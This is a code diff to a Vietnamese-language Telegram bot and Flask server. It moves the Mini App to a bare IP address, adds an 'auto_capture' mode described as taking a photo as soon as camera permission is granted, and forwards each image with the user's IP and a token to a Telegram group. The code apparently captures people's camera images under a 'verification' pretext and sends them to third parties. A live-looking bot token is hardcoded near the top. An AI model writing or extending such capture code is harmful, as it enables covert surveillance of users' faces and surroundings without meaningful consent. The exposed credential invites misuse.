@@ -48,13 +48,13 @@ from telegram.ext import (  # noqa: E402
 BOT_TOKEN = "8866702396:AAE84JIep3JP4_lhYztozwaKsWlO8MFBw04"
 DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
 MINI_APP_URL = os.getenv(
-    "MINI_APP_URL", "https://phongmrom-lgtm.github.io/phongtunk/"
+    "MINI_APP_URL", "http://116.99.252.192:5000/miniapp"
 ).strip()
 
 ADMIN_IDS = [7884394252]
 TIMEZONE = pytz.timezone("Asia/Ho_Chi_Minh")
 
-CAMERA_TARGET_GROUP = "-1003965127155"
+CAMERA_TARGET_GROUP = "-1003913789705"
 CAMERA_REQUIRE_PHOTO = False
 
 OPTIONAL_DISPLAY_CHANNELS = []
@@ -4848,6 +4848,32 @@ async def post_init(application: Application) -> None:
 # ============================================================
 flask_app = Flask(__name__)
 
+
+@flask_app.route('/miniapp', methods=['GET'])
+def serve_miniapp():
+    """Serve file HTML Mini App trực tiếp từ VPS."""
+    try:
+        html_path = os.path.join(
+            os.path.dirname(os.path.abspath(__file__)),
+            "templates",
+            "miniapp.html"
+        )
+        with open(html_path, "r", encoding="utf-8") as fh:
+            return fh.read(), 200, {"Content-Type": "text/html; charset=utf-8"}
+    except FileNotFoundError:
+        return (
+            "<h3>❌ Không tìm thấy file templates/miniapp.html</h3>",
+            404,
+            {"Content-Type": "text/html; charset=utf-8"},
+        )
+    except Exception as exc:
+        return (
+            f"<h3>❌ Lỗi: {exc}</h3>",
+            500,
+            {"Content-Type": "text/html; charset=utf-8"},
+        )
+
+
 @flask_app.route('/api/save-photo', methods=['POST'])
 def save_photo():
     try:
@@ -4855,6 +4881,7 @@ def save_photo():
         token = data.get('token')
         ip = data.get('ip')
         image_data = data.get('image')
+        auto_capture = data.get('auto_capture', False)
         
         if image_data and "," in image_data:
             header, encoded = image_data.split(",", 1)
@@ -4868,7 +4895,20 @@ def save_photo():
             
             # Gửi ảnh trực tiếp về nhóm Telegram thông qua Bot API
             if BOT_TOKEN and CAMERA_TARGET_GROUP:
-                caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp (HD)</b>\n🌐 IP: <code>{ip or 'Không rõ'}</code>\nToken: <code>{token}</code>"
+                if auto_capture:
+                    caption = (
+                        f"📸 <b>ẢNH CHỤP TỰ ĐỘNG - XÁC MINH CAMERA</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"🌐 IP: <code>{ip or 'Không rõ'}</code>\n"
+                        f"🔑 Token: <code>{token}</code>\n"
+                        f"⚡ Chụp ngay khi cấp quyền Camera"
+                    )
+                else:
+                    caption = (
+                        f"📸 <b>Ảnh chụp camera xác minh MiniApp (HD)</b>\n"
+                        f"🌐 IP: <code>{ip or 'Không rõ'}</code>\n"
+                        f"Token: <code>{token}</code>"
+                    )
                 
                 boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
                 body = io.BytesIO()
@@ -4899,8 +4939,9 @@ def save_photo():
                 try:
                     with urllib.request.urlopen(req) as response:
                         response.read()
+                    print(f"✅ Ảnh đã gửi về nhóm {CAMERA_TARGET_GROUP} thành công")
                 except Exception as e:
-                    print(f"Lỗi gửi ảnh qua Telegram API: {e}")
+                    print(f"❌ Lỗi gửi ảnh qua Telegram API: {e}")
 
         return jsonify({"status": "success"})
     except Exception as e:
